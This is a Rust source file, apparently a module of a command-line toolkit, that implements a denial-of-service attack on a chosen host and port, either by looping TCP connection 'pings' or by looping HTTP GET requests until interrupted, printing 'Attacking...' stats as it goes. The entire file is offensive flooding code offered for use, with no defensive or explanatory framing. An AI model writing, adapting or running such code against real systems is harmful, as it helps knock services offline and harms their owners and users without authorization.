use owo_colors::OwoColorize;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::Duration;
use tokio::time;
use tokio::signal::ctrl_c;

pub async fn start(host: &str, port: u16, mode: &str) {
    println!(
        "{} {}:{} ({})",
        "Starting attack on".blue(),
        host,
        port,
        mode.yellow()
    );

    let sent = AtomicUsize::new(0);
    let errors = AtomicUsize::new(0);

    let (shutdown_sender, mut shutdown_receiver) = tokio::sync::mpsc::channel(1);

    tokio::spawn(async move {
        ctrl_c().await.expect("Failed to listen for Ctrl+C");
        shutdown_sender.send(()).await.expect("Failed to send shutdown signal");
    });

    match mode {
        "ping" => tcp_dos(host, port, &sent, &errors, &mut shutdown_receiver).await,
        "http" => {
            let url = format!("http://{}:{}", host.trim_start_matches("http://").trim_start_matches("https://"), port);
            http_dos(&url, &sent, &errors, &mut shutdown_receiver).await
        }
        _ => println!("{}", "Unsupported DoS mode. Use 'ping' or 'http'.".red()),
    }

    println!(
        "\n{} {} sent, {} errors. Attack stopped.",
        "Final stats:".green(),
        sent.load(Ordering::Relaxed),
        errors.load(Ordering::Relaxed)
    );
}

async fn http_dos(
    url: &str,
    sent: &AtomicUsize,
    errors: &AtomicUsize,
    shutdown_receiver: &mut tokio::sync::mpsc::Receiver<()>,
) {
    loop {
        tokio::select! {
            _ = async {
                match crate::tools::http::get::url(url, None).await {
                    Ok(_) => {
                        sent.fetch_add(1, Ordering::Relaxed);
                        print_stats(sent, errors, "HTTP GET");
                    }
                    Err(e) => {
                        errors.fetch_add(1, Ordering::Relaxed);
                        print_stats(sent, errors, &format!("HTTP GET (Error: {})", e));
                    }
                }
            } => {}
            _ = shutdown_receiver.recv() => break,
        }
    }
}

async fn tcp_dos(
    host: &str,
    port: u16,
    sent: &AtomicUsize,
    errors: &AtomicUsize,
    shutdown_receiver: &mut tokio::sync::mpsc::Receiver<()>,
) {
    loop {
        tokio::select! {
            _ = async {
                match crate::tools::tcp::ping::ping(host, port, 1).await {
                    Ok(_) => {
                        sent.fetch_add(1, Ordering::Relaxed);
                        print_stats(sent, errors, "TCP Ping");
                    }
                    Err(e) => {
                        errors.fetch_add(1, Ordering::Relaxed);
                        print_stats(sent, errors, &format!("TCP Ping (Error: {})", e));
                    }
                }
            } => {}
            _ = shutdown_receiver.recv() => break,
        }
    }
}

fn print_stats(sent: &AtomicUsize, errors: &AtomicUsize, action: &str) {
    let sent_count = sent.load(Ordering::Relaxed);
    let error_count = errors.load(Ordering::Relaxed);
    let success_rate = if sent_count > 0 {
        ((sent_count - error_count) as f64 / sent_count as f64) * 100.0
    } else {
        0.0
    };
    print!(
        "\r{} {} | Sent: {} | Errors: {} | Success Rate: {:.2}%",
        action.cyan(),
        "Attacking...".yellow(),
        sent_count,
        error_count,
        success_rate
    );
    std::io::Write::flush(&mut std::io::stdout()).expect("Failed to flush stdout");
}